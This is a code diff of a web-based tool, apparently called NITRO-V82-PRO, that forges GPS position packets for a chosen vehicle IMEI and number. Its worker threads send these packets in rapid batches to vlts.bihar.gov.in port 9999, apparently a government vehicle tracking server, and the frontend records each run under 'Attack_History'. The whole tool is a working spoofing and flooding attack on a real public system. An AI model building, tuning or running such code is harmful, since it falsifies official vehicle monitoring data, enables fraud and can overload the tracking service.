@@ -48,7 +48,7 @@ def init(v:str, i:str, lt:str, ln:str):
             threading.Thread(target=handshake_worker, args=(tag,i,v_up,lt,ln), daemon=True).start()
     return {"ok": True}
 
-# --- 🚀 SPEED OPTIMIZED WORKER (STRICTLY NO LOGIC CHANGE) ---
+# --- 🚀 SPEED OPTIMIZED WORKER ---
 def handshake_worker(tag, imei, vno, lat, lon):
     global firing, total_sent
     while firing:
@@ -57,7 +57,6 @@ def handshake_worker(tag, imei, vno, lat, lon):
             s.settimeout(5)
             s.connect(("vlts.bihar.gov.in", 9999))
             
-            # Fast Batch Injection (10 packets per connection for speed)
             for _ in range(10):
                 if not firing: break
                 now = datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
@@ -65,7 +64,7 @@ def handshake_worker(tag, imei, vno, lat, lon):
                 pkt = f"$PVT,{tag},2.1.1,NR,01,L,{imei},{vno},1,{dt},{tm},{lat},N,{lon},E,0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041,DDE3*\\r\\n"
                 s.sendall(bytes(pkt, 'ascii'))
                 total_sent += 1
-                time.sleep(0.02) # Optimized Sleep for Fast Interval
+                time.sleep(0.02) 
             s.close()
         except: time.sleep(0.5)
 
@@ -243,11 +242,13 @@ async def home():
         }
 
         function getLocation() {
-            navigator.geolocation.getCurrentPosition(pos => {
-                document.getElementById('lt').value = pos.coords.latitude.toFixed(6);
-                document.getElementById('ln').value = pos.coords.longitude.toFixed(6);
-                updateMap(pos.coords.latitude, pos.coords.longitude);
-            });
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(pos => {
+                    document.getElementById('lt').value = pos.coords.latitude.toFixed(6);
+                    document.getElementById('ln').value = pos.coords.longitude.toFixed(6);
+                    updateMap(pos.coords.latitude, pos.coords.longitude);
+                });
+            } else { alert("Geolocation is not supported by this browser."); }
         }
 
         function logout() { localStorage.removeItem('nitro_user'); location.reload(); }
@@ -265,30 +266,24 @@ async def home():
             }, 1000);
         }
 
-        // --- 🚀 FIX: VEHICLE KEY LOGGING (NO RANDOM ID) ---
         async function sp() {
             fetch('/stop');
             clearInterval(mon); mon = null;
             let total = document.getElementById('c').innerText;
             let v_no = document.getElementById('v').value.toUpperCase().trim();
-            
             if(parseInt(total) > 0 && v_no !== ""){
                 let istTime = new Date(new Date().getTime() + (5.5 * 60 * 60 * 1000));
                 let dateKey = istTime.toISOString().split('T')[0];
-                let timeStr = istTime.toTimeString().split(' ')[0];
-                
                 let fullRecord = {
                     Vehicle_No: v_no,
                     IMEI_No: document.getElementById('i').value.trim(),
                     Lat: document.getElementById('lt').value.trim(),
                     Lon: document.getElementById('ln').value.trim(),
                     total_sent: total,
-                    time: timeStr,
+                    time: istTime.toTimeString().split(' ')[0],
                     Status: "Completed",
                     Source: "NITRO-V82-PRO"
                 };
-                
-                // 🛑 Fixed: Used PUT with Vehicle_No as key to avoid random IDs
                 fetch(`${DB}/Attack_History/${dateKey}/${curUser.mobile}/${v_no}.json`, {
                     method: 'PUT',
                     body: JSON.stringify(fullRecord)
